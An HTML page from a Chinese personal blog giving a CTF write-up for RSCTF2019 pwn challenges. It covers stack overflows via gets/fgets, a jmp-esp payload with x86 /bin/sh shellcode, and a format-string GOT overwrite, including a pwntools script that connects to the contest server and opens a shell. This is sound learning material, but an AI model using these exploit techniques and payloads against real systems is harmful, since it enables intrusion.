@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="pwn-1刚开始研究pwn不太会，只能f5了，一看 发现，采用的是gets函数读取用户输入，这为我们提供了利用点， 通过图上我们知道，v4距离ebp的长度为0x20 所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。 pwn3提供了fun函数，我们得到fun函数地址为：0x04005B6 所以，我们可以写出exp  pwn-2 略难，对我这种萌新不太友好，不会2333333">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RSCTF2019_PWN">
+<meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2019&#x2F;11&#x2F;03&#x2F;RSCTF2019-PWN.html">
+<meta property="og:site_name" content="Jesen&#39;s Blog">
+<meta property="og:description" content="pwn-1刚开始研究pwn不太会，只能f5了，一看 发现，采用的是gets函数读取用户输入，这为我们提供了利用点， 通过图上我们知道，v4距离ebp的长度为0x20 所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。 pwn3提供了fun函数，我们得到fun函数地址为：0x04005B6 所以，我们可以写出exp  pwn-2 略难，对我这种萌新不太友好，不会2333333">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002-1572790655656.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image003.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002-1572790864072.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image004-1572790864072.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image006-1572790864072.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image008.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002-1572791007549.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image004-1572791007549.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image006-1572791007549.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002-1572791136273.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image004-1572791136273.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image006-1572791136273.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image008-1572791136273.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image010.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002.png">
+<meta property="og:updated_time" content="2019-11-03T14:29:40.682Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;clip_image002-1572790655656.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://mrjesen.github.io/2019/11/03/RSCTF2019-PWN.html"/>
+
+
+
+
+
+  <title>RSCTF2019_PWN | Jesen's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jesen's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">想要人前装逼,必须得在人后学习</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/#" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/#%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/#%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/#" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://mrjesen.github.io/2019/11/03/RSCTF2019-PWN.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jesen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/jesen.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jesen's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">RSCTF2019_PWN</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-03T22:03:36+08:00">
+                2019-11-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h1><p>刚开始研究pwn不太会，只能f5了，一看<img src="/images/clip_image002-1572790655656.jpg" alt="img"></p>
+<p>发现，采用的是gets函数读取用户输入，这为我们提供了利用点，</p>
+<p>通过图上我们知道，v4距离ebp的长度为0x20</p>
+<p>所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。</p>
+<p>pwn3提供了fun函数，我们得到fun函数地址为：<code>0x04005B6</code></p>
+<p>所以，我们可以写出exp</p>
+<p><img src="/images/clip_image003.png" alt="img"></p>
+<h1 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h1><p> 略难，对我这种萌新不太友好，不会233333333</p>
+<h1 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn-3"></a>pwn-3</h1><p><em>嘴上说着pwn3，其实文件名是pwn5</em> 先查看文件保护checksec。</p>
+<p><img src="/images/clip_image002-1572790864072.jpg" alt="img"></p>
+<p>什么都没开，高兴!这里我们直接拖进ida</p>
+<p><img src="/images/clip_image004-1572790864072.jpg" alt="img"></p>
+<p>​                            main函数毫无营养。</p>
+<p>​                            还是看pwn()吧。</p>
+<p><img src="/images/clip_image006-1572790864072.jpg" alt="img"></p>
+<p>s是24个字节，但是fgets读取了50个字节，所以会造成溢出。</p>
+<p>我们在ida的函数列表里没有发现与system相关函数。</p>
+<p>程序也没有调用so</p>
+<p>所以只能我们自己构造shellcode了。（nx和canary都没开启保护，所以我们可以执行任意代码，现在我们的任务就是构造shellcode，找一个jmp</p>
+<p>esp） 同时注意jmp后要抬高栈帧。pwntools可以做到。</p>
+<p>我在这里找到了<a href="https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，</a></p>
+<p>因此我们的最终payload就是:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_x86 + (<span class="number">0x20</span>-len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> +p32(jmp_esp) + sub_esp_jmp</span><br></pre></td></tr></table></figure>
+
+<p>这里的jmp esp的地址是用ROPgadgets找到的</p>
+<p>Command: <code>ROPgadgets –binary pwn5 –only ”jmp|ret” | grep esp</code></p>
+<p>只有这一个 <code>0x08048554</code></p>
+<p>至此我们可以写出我们的exp了。</p>
+<p><img src="/images/clip_image008.jpg" alt="img"></p>
+<p>然后成功getflag</p>
+<h1 id="pwn-4"><a href="#pwn-4" class="headerlink" title="pwn-4"></a>pwn-4</h1><p><em>嘴上说着pwn4，其实文件名是pwn6</em></p>
+<p><img src="/images/clip_image002-1572791007549.jpg" alt="img"></p>
+<p>整体流程如下</p>
+<p>先输入一个数字，判断是否等于1926，等于就退出，</p>
+<p>接着用gets获取了v5变量。这个是溢出点。</p>
+<p>所以我们编写exp的思路就是，</p>
+<p>先让v6不等于1926，不然没法跳到如果假的分支。</p>
+<p>然后v5我们溢出。</p>
+<p>所以我们现在就是需要计算v5和v6之间需要多少字节来填充。</p>
+<p>gdb：<img src="/images/clip_image004-1572791007549.jpg" alt="img"></p>
+<p>我是输入了16和15来作为v6和v5的值</p>
+<p>从图中我们发现：</p>
+<p><code>0x7ffffffffffe0e0</code>是15</p>
+<p><code>0x7ffffffffffe0e8</code>是0x10 = 16</p>
+<p>所以我们知道v5和v6之间需要8个字节。</p>
+<p>由此我们构造出wp为：</p>
+<p><img src="/images/clip_image006-1572791007549.jpg" alt="img"></p>
+<h1 id="Entry-level-pwn"><a href="#Entry-level-pwn" class="headerlink" title="Entry level pwn"></a>Entry level pwn</h1><p>看到给到的文件名（format），我们想到这是一个pwn的字符串序列化的题，</p>
+<p>查看源码，果然，在pwn函数中，</p>
+<p><img src="/images/clip_image002-1572791136273.jpg" alt="img"></p>
+<p>我们发现，这果然是经典的字符串解析漏洞题型，</p>
+<p>输入%x测试，</p>
+<p><img src="/images/clip_image004-1572791136273.jpg" alt="img"></p>
+<p>A的ascii码正好是41，所以发现offset（偏移）为7.</p>
+<p>接下来我们需要把printf替换成system，然后输入/bin/sh就行了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf_got = 0x0804A014</span><br><span class="line">system_plt = 0x08048410</span><br></pre></td></tr></table></figure>
+
+<p>这两个地址有两个寻找方法，均有效，最快捷的为，</p>
+<h2 id="方法1：-（pwntools提供）"><a href="#方法1：-（pwntools提供）" class="headerlink" title="方法1： （pwntools提供）"></a>方法1： （pwntools提供）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(‘./format’)</span><br><span class="line">print hex(e.got[‘printf’])</span><br><span class="line">print hex(e.plt[‘system’])</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>​    ida上找：</p>
+<p><img src="/images/clip_image006-1572791136273.jpg" alt="img"></p>
+<p><img src="/images/clip_image008-1572791136273.jpg" alt="img"></p>
+<p>payload = p32(printf_got)+”%”+str(system_plt-4)+”c%7$n”</p>
+<p>这是最初的payload,</p>
+<p>但是我发现，这样是不行，会输出无数个空字符，等了几分组仍没有停止。</p>
+<p>通过查找资料发现，<a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9329387.html</a> 里面写道它会输出100+mb的字符，这显然是不行的。同时资料里提到，pwntools提供了一种专门针对formatstingr的payload的方法。</p>
+<p>详情参见： <a href="http://docs.pwntools.com/en/stable/fmtstr.html" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html</a></p>
+<p>payload = fmtstr_payload(offset,{printf_got:system_plt})</p>
+<p>offset此题为7.</p>
+<p>因此最终exp为：<img src="/images/clip_image010.jpg" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'117.139.247.14'</span>, <span class="number">9939</span>)</span><br><span class="line">printf_got = <span class="number">0x0804A014</span></span><br><span class="line">system_plt = <span class="number">0x08048410</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>python运行即可，</p>
+<h1 id="Veryeasypwn"><a href="#Veryeasypwn" class="headerlink" title="Veryeasypwn"></a>Veryeasypwn</h1><p>拖入ida，空格看流程图，详见流程图.png</p>
+<p><img src="/images/clip_image002.png" alt="img"></p>
+<p>发现cmp eax,1/2/3/4/0x…..忘了，反正转为整型是233</p>
+<p>所以在choice输入233即可跳转到fun_sys进而执行shell</p>
+<p>输入cat /flag得到getflag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/03/RSCTF2019-WEB.html" rel="next" title="RSCTF2019-WEB">
+                <i class="fa fa-chevron-left"></i> RSCTF2019-WEB
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/jesen.jpg"
+                alt="Jesen" />
+            
+              <p class="site-author-name" itemprop="name">Jesen</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/#%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/mejesen" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jesen@protonmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://mejsen.github/" title="Blog" target="_blank">Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-1"><span class="nav-number">1.</span> <span class="nav-text">pwn-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-2"><span class="nav-number">2.</span> <span class="nav-text">pwn-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-3"><span class="nav-number">3.</span> <span class="nav-text">pwn-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-4"><span class="nav-number">4.</span> <span class="nav-text">pwn-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Entry-level-pwn"><span class="nav-number">5.</span> <span class="nav-text">Entry level pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法1：-（pwntools提供）"><span class="nav-number">5.1.</span> <span class="nav-text">方法1： （pwntools提供）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法2"><span class="nav-number">5.2.</span> <span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Veryeasypwn"><span class="nav-number">6.</span> <span class="nav-text">Veryeasypwn</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jesen</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
